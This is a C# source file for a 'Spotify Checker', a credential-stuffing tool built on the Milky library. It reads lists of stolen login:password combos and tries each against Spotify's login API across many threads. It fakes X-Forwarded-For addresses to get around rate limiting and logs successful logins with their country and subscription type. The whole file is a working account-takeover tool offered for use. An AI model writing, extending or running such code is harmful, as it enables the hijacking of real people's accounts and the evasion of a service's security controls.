using Milky.Objects;
using MilkyNet;
using System;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using static Milky.Output.OutputSettings;

namespace Spotify_Checker
{
    class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            MilkyManager Milky = new MilkyManager();
            Milky.ProgramManager.Initialize("Spotify Checker", "1.0.0", "Laiteux", "https://pastebin.com/raw/QW82zeqi");

            Milky.FileUtils.LoadCombos();

            int threads = Milky.UserUtils.AskInteger("Threads");
            Milky.RunSettings.threads = threads;
            ThreadPool.SetMinThreads(threads, threads);

            Milky.ConsoleSettings.SetTitleStyle(true, true);

            Milky.RunManager.StartRun();

            Random random = new Random();

            Parallel.ForEach(Milky.RunLists.combos, new ParallelOptions { MaxDegreeOfParallelism = Milky.RunSettings.threads }, combo =>
            {
                string[] splittedCombo = combo.Split(':');

                ResultType resultType = ResultType.Invalid;
                CaptureDictionary captures = new CaptureDictionary();

                if (splittedCombo.Length == 2)
                {
                    string login = splittedCombo[0];
                    string password = splittedCombo[1];

                    while (resultType == ResultType.Invalid)
                    {
                        string ip = $"{random.Next(1, 255)}.{random.Next(0, 255)}.{random.Next(0, 255)}.{random.Next(0, 255)}";

                        MilkyRequest request = new MilkyRequest()
                        {
                            Cookies = new CookieDictionary()
                        };

                        try
                        {
                            request.AddHeader("X-Forwarded-For", ip);

                            MilkyResponse response1 = Milky.RequestUtils.Execute(request,
                                HttpMethod.GET, "https://accounts.spotify.com/en/login");

                            if (response1.ContainsCookie("csrf_token"))
                            {
                                string csrf_token = response1.Cookies["csrf_token"];

                                request.AddHeader("X-Forwarded-For", ip);
                                request.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                                request.AddHeader("User-Agent", "Mozilla");

                                request.Cookies.Add("__bon", "MHwwfDB8MHwxfDF8MXwx");

                                string response2 = Milky.RequestUtils.Execute(request,
                                    HttpMethod.POST, "https://accounts.spotify.com/api/login",
                                    $"username={Uri.EscapeDataString(login)}&password={Uri.EscapeDataString(password)}&csrf_token={Uri.EscapeDataString(csrf_token)}").ToString();

                                if (response2.Contains("displayName"))
                                {
                                    request.AddHeader("X-Forwarded-For", ip);

                                    string response3 = Milky.RequestUtils.Execute(request,
                                        HttpMethod.GET, "https://www.spotify.com/us/account/overview/").ToString();

                                    if (response3.Contains("<h1>Account overview</h1>"))
                                    {
                                        resultType = ResultType.Hit;

                                        string country = new Regex("<p class=\"form-control-static\" id=\"card-profile-country\">([^<]*)").Match(response3).Groups[1].Value;
                                        string subscription = new Regex("<div class=\"well card subscription.*>(.*)</h3>").Match(response3).Groups[1].Value;
                                        bool familyOwner = response3.Contains("btn-manage-familyplan");

                                        if (subscription == "Spotify Free")
                                            resultType = ResultType.Free;

                                        captures = new CaptureDictionary
                                        {
                                            { "Country", country },
                                            { "Subscription", subscription },
                                            { "Family Owner", familyOwner.ToString() }
                                        };

                                        break;
                                    }
                                    else
                                    {
                                        break;
                                    }
                                }
                                else if (response2.Contains("errorInvalidCredentials"))
                                {
                                    break;
                                }
                            }
                        }
                        catch { }

                        request.Dispose();
                    }
                }

                Milky.RunManager.SubmitComboResult(combo, resultType, captures);
            });

            Milky.RunManager.FinishRun();

            Thread.Sleep(-1);
        }
    }
}
